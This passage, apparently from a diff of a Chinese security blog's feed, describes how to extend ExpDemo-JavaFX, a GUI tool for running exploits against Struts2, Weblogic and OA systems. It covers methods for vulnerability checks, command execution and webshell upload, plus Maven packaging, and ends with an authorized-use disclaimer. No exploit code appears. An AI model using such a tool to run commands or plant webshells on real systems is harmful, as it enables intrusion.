HTTPS 请求证书设置</span><br><span class="line">        │               └── Tools.java     一些处理函数</span><br><span class="line">        └── resources    资源文件夹</span><br><span class="line">            ├── css      界面css样式表</span><br><span class="line">            │   └── main.css</span><br><span class="line">            ├── fxml    界面的设计文件</span><br><span class="line">            │   ├── Main.fxml</span><br><span class="line">            │   ├── OA.fxml</span><br><span class="line">            │   ├── Others.fxml</span><br><span class="line">            │   ├── Struts2.fxml</span><br><span class="line">            │   ├── Weblogic.fxml</span><br><span class="line">            │   └── oa</span><br><span class="line">            │       ├── OA-E-office.fxml</span><br><span class="line">            │       ├── OA-Kingdee.fxml</span><br><span class="line">            │       ├── OA-Landray.fxml</span><br><span class="line">            │       └── OA-Seeyon.fxml</span><br><span class="line">            ├── img</span><br><span class="line">            │   ├── sec.png</span><br><span class="line">            │   └── weixin.jpg</span><br><span class="line">            └── log4j.properties   日志相关设置</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-2-编写EXP"><a href="#3-2-编写EXP" class="headerlink" title="3.2 编写EXP"></a>3.2 编写EXP</h4><p>编写EXP时，要使用 <code>implements</code>实现<code>ExploitInterface</code>接口，实现接口中的几个方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133114.png" alt="image-20210327190517731"></p>
+<ul>
+<li>checkVUL		使用poc 检查是否漏洞</li>
+<li>exeCMD          使用exp执行命令</li>
+<li>uploadFile        使用命令执行 写webshell，上传文件</li>
+<li>getWebPath     获取网站的web目录，供上传文件使用</li>
+<li>isVul                是否存在漏洞，检查时会根据结构自动赋值，供后续调用</li>
+</ul>
+<p>EXP具体编写请参考 <code>fun/fireline/exp</code> 下的各种漏洞实现</p>
+<p>当编写完EXP后，转到 <code>fun/fireline/controller</code> 下对应的<strong>xxController.java</strong>文件，比如新编写了Struts2的相关漏洞，修改<strong>Struts2Controller.java</strong>的<strong>STRUTS2</strong>变量，新加入一个漏洞名称，这里对应的是图像化界面中可供选择的漏洞列表</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133131.png" alt="image-20210818125816864"></p>
+<p>之后进入和 <code>fun/fireline/tools/Tools.java</code> 的<strong>getExploit</strong>方法中新增一个<strong>else if</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133137.png" alt="image-20210818130128550"></p>
+<p>编写完后，可以直接执行<code>fun/fireline/AppStartUp.java</code>类, 查看是否正常运行。</p>
+<p>开发过程中每次修改完运行前，最好将生成的<strong>target</strong>目录删除再运行</p>
+<h4 id="3-3-新增漏洞页面"><a href="#3-3-新增漏洞页面" class="headerlink" title="3.3 新增漏洞页面"></a>3.3 新增漏洞页面</h4><p>具体请看<a href="https://github.com/yhy0/ExpDemo-JavaFX/blob/master/%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95.md">更新记录.md</a></p>
+<p><a href="https://mp.weixin.qq.com/s/j5BHSbNZ76XbSZp6hFj9fw">ExpDemo-JavaFX工具新增漏洞编写教程</a></p>
+<h4 id="3-4-部署，发布"><a href="#3-4-部署，发布" class="headerlink" title="3.4 部署，发布"></a>3.4 部署，发布</h4><p>当一切编写完成，bug修复完毕，在项目根目录下执行 <strong>mvn package assembly:single</strong> 即可生成 <strong>jar</strong> 文件。</p>
+<p>运行使用<strong>target目录下最大的jar文件</strong> </p>
+<p>对方没有Java环境怎么办？</p>
+<p>使用 <strong>mvn jfx:native</strong> 命令生产对应平台的文件，比如Mac下，执行命令<strong>mvn jfx:native</strong>命令就会在 <strong>target&#x2F;jfx&#x2F;native</strong> 目录下生成打包后应用(win下生成exe)，带可执行文件，带 JRE 运行环境，超大，200+M。</p>
+<p> <strong>mvn clean</strong>用于清除生成的文件。</p>
+<h2 id="0x05-免责声明"><a href="#0x05-免责声明" class="headerlink" title="0x05 免责声明"></a>0x05 免责声明</h2><p>本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。</p>
+<p>如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。</p>
+<p>除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。</p>
+<p>您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>
+<h2 id="开心指数"><a href="#开心指数" class="headerlink" title="开心指数"></a>开心指数</h2><p><a href="https://starchart.cc/yhy0/ExpDemo-JavaFX"><img src="https://starchart.cc/yhy0/ExpDemo-JavaFX.svg" alt="Stargazers over time"></a></p>
+]]></content>
+      <categories>
+        <category>开源工具</category>
+      </categories>
+      <tags>
+        <tag>开源工具</tag>
       </tags>
   </entry>
   <entry>
